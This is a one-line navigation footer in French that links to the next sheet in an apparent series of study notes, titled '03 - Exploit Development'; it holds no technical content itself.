→ Fiche suivante : **[03 - Exploit Development](03-exploit-development.md)**
